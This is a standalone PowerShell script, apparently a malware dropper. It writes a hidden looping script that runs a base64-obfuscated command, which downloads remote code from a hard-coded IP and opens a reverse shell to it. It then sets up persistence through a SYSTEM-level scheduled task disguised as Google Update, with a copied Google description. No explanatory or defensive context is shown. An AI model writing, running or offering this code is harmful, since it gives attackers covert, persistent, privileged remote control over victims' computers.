Set-Content -Path "$env:TEMP\update.ps1" -Value "do {Start-Process cmd.exe -ArgumentList '/c powershell -nop -W hidden -e SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgAxADQANQAuADgAOAAvAGMAbwBuAHAAdAB5AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAOwAgAEkAbgB2AG8AawBlAC0ASwBlAGQAdABoAGUAcwBoAGUAbABsACAAMQAzADkALgA1ADkALgAxADQANQAuADgAOAAgADEAMwAzADcA' -WindowStyle Hidden; Start-Sleep -s 90} while (1)";$ScriptPath = "$env:TEMP\update.ps1";$TaskName = "GoogleUpdateTasktMachineMain";$Trigger = New-ScheduledTaskTrigger -AtLogon;$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$ScriptPath`"";$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew -Priority 7 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1);$Description = "Google keeps your software up to date. If this task is disabled or stopped, your Google software will not be kept up to date. This means that vulnerabilities that may occur may not be repaired and features may not work. This task uninstalls itself when there is no Google software using it.";Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -Action $Action -Settings $Settings -Description $Description -User "SYSTEM" -RunLevel Highest
